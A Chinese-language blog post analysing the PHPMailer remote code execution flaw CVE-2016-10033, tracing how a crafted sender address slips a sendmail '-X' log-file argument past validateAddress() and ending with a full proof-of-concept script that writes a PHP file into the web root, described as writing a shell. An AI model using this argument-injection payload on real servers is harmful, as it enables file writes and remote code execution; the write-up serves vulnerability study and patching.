---
layout: post
title:  "PHPMailer远程代码执行漏洞的分析（CVE-2016-10033）"
date:   2018-12-06 20:15:33 +0700
categories: [命令执行]
---
> PHPMailer是一个基于PHP语言的邮件发送组件，被广泛运用于诸如WordPress, Drupal, 1CRM, SugarCRM, Yii, Joomla!等用户量巨大的应用与框架中。
>
> 攻击者可以通过巧妙构造收件者的邮箱即可绕过其中的检测，即可写入任意文件，造成远程命令执行的危害。

## 0x00 php mail()

Mail函数的语法如下：

```
mail(to,subject,message,headers,parameters)
```

其中第五个参数是可选的，可用于将其他参数传递给配置为在使用sendmail_path配置设置发送邮件时使用的程序。例如：当使用带有-f sendmail选项的sendmail时，这可用于设置信封发件人地址。

还有一个很重要的参数

```
-X logfile
```

`-X`参数可以将邮件内容写入指定日志文件，这么说如果第五个参数是可控的，那么可以将含有邮件内容写入指定的日志文件，从而完成远程代码执行。

参考：http://php.net/manual/zh/function.mail.php

## 0x01 PHPMailer 请求过程分析

当我们使用PHPMailer发送一个邮件时，其处理过程是：

1. PHPMailer获得用户请求
2. PHPMailer对用户输入的参数进行检验
3. PHPMailer传递数据给php中 mail()函数进行发送函数。

在上面的过程中，第二步对参数的检验是产生漏洞的原因，下面是PHPMailer对参数的检验过程：

使用PHPMailer发送邮件脚本：

```php
<?php
require 'PHPMailerAutoload.php';

function send($from) {
    $mail = new PHPMailer;

    $mail->setFrom($from);
    $mail->addAddress('test@example.net', 'test');     // Add a recipient

    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Host = "smtp.example.com";
    $mail->Subject = '<?php phpinfo(); ?>';
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    if(!$mail->send()) {
        echo 'Message could not be sent.';
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    } else {
        echo 'Message has been sent' . "\n";
    }

    unset($mail);
}

$address = "123456@qq.com";

send($address);
?>
```

使用单步调试，会发现 `$address` 变量经过 `setFrom()` 函数进行检验

![1544021987(1)]({{site.url}}/images/1544021987(1).jpg)

检验通过后会将`$address` 赋值给 `$this->sender` ，其中我们主要关注不能让函数执行 `return false`，来看看 `validateAddress($address)` 函数，代码如下：

```php
public static function validateAddress($address, $patternselect = null)
    {
        if (is_null($patternselect)) {
            $patternselect = self::$validator;
        }
        if (is_callable($patternselect)) {
            return call_user_func($patternselect, $address);
        }
        //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321
        if (strpos($address, "\n") !== false or strpos($address, "\r") !== false) {
            return false;
        }
        if (!$patternselect or $patternselect == 'auto') {
            //Check this constant first so it works when extension_loaded() is disabled by safe mode
            //Constant was added in PHP 5.2.4
            if (defined('PCRE_VERSION')) {
                //This pattern can get stuck in a recursive loop in PCRE <= 8.0.2
                if (version_compare(PCRE_VERSION, '8.0.3') >= 0) {
                    $patternselect = 'pcre8';
                } else {
                    $patternselect = 'pcre';
                }
            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
                //Fall back to older PCRE
                $patternselect = 'pcre';
            } else {
                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
                if (version_compare(PHP_VERSION, '5.2.0') >= 0) {
                    $patternselect = 'php';
                } else {
                    $patternselect = 'noregex';
                }
            }
        }
        switch ($patternselect) {
            case 'pcre8':
                /**
                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
                 * @link http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (boolean)preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'pcre':
                //An older regex that doesn't need a recent PCRE
                return (boolean)preg_match(
                    '/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>' .
                    '[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")' .
                    '(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*' .
                    '@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})' .
                    '(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:' .
                    '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?' .
                    '::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:' .
                    '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?' .
                    '::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD',
                    $address
                );
            case 'html5':
                /**
                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.
                 * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (boolean)preg_match(
                    '/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .
                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',
                    $address
                );
            case 'noregex':
                //No PCRE! Do something _very_ approximate!
                //Check the address is 3 chars or longer and contains an @ that's not the first or last char
                return (strlen($address) >= 3
                    and strpos($address, '@') >= 1
                    and strpos($address, '@') != strlen($address) - 1);
            case 'php':
            default:
                return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);
        }
    }
```

仔细分析，上面的函数会根据 `$patternselect` 变量选择对Email进行检测，`$patternselect` 的值是根据 `$patternselect = self::$validator` 得到。那么上面的函数有如下作用：

1. 默认patternselect==‘auto’，它会自动选择一个方式对email进行检测
2. 如果php支持正则PCRE（也就是包含`preg_replace`函数），就用正则的方式来检查
3. 如果php不支持PCRE，且PHP版本大于PHP5.2.0，就是用PHP自带的filter来检查email
4. 如果php不支持PCRE，且PHP版本小于PHP5.2.0，就直接检测email是否包含 `@`
5. 还可以指定 `noregex`

其中开发者还可以自定义检测规则：

```php
* PHPMailer::validateAddress('user@example.com', function($address) {
*     return (strpos($address, '@') !== false);
* });
* You can also set the PHPMailer::$validator static to a callable, allowing built-in methods to use your validator.
```

因此我们的绕过思路是：

1. 用户自定义的规则和 `noregex`
2. 绕过正则
3. php不支持PCRE其版本低于5.2.0（默认是安装的）

但是第一和第三种方法是非常鸡肋的，但是通过仔细分析正则表达式，可以找到引入空格的方法：

```
aaa( -X/var/www/html/test.php )@qq.com
```

（通过加`“ ”` 也可以添加空格）

那么我们通过调试判断是否可以绕过：

1. 将address设置为`aaa( -X/var/www/html/test.php )@qq.com`

2. 通过`validateAddress($address)` 函数

   ![1544023434(1)]({{site.url}}/images/1544023434(1).jpg)

3. 可以看到 `address` 变量并没有被过滤，而是赋值给了 `sender` 。那么可以验证此方法是可行的。

接下来继续分析  `sender` 变量传递到哪里。

发送邮件的例子末尾的send函数调用链： 

```
$mail->send() -> $this->postSend() -> $this->mailSend()->$this->mailPassthru->@mail()
```

之前可控的`$this->Sender`被处理之后带入`$this->mailPassthru()`

![1544024199(1)]({{site.url}}/images/1544024199(1).jpg)

`mailPassthru()` 调用 php中的 `mail()` 函数

![1544024279(1)]({{site.url}}/images/1544024279(1).jpg)

那么我们就可以直接在服务器下写下shell了。

## 0x02 payload

```php
<?php
require 'PHPMailer/PHPMailerAutoload.php';

function send($from) {
    $mail = new PHPMailer;

    $mail->setFrom($from);
    $mail->addAddress('joe@example.net', 'Joe User');     // Add a recipient

    $mail->isHTML(true);                                  // Set email format to HTML

    $mail->Subject = '<?php phpinfo(); ?>'; //shell
    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
    $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    if(!$mail->send()) {
        echo 'Message could not be sent.';
        echo 'Mailer Error: ' . $mail->ErrorInfo;
    } else {
        echo 'Message has been sent' . "\n";
    }

    unset($mail);
}

$address = "aaa( -X/home/www/test.php )@qq.com"; //写下日志

send($address);
```

利用这个payload，是无需PHP满足什么条件的，通用写文件Payload。

## 0x03 解决方案

所有PHPMailer的用户应该立刻升级到最新版本。



参考：

- https://github.com/PHPMailer/PHPMailer
- https://www.exploit-db.com/exploits/40968/
- http://pwnscriptum.com/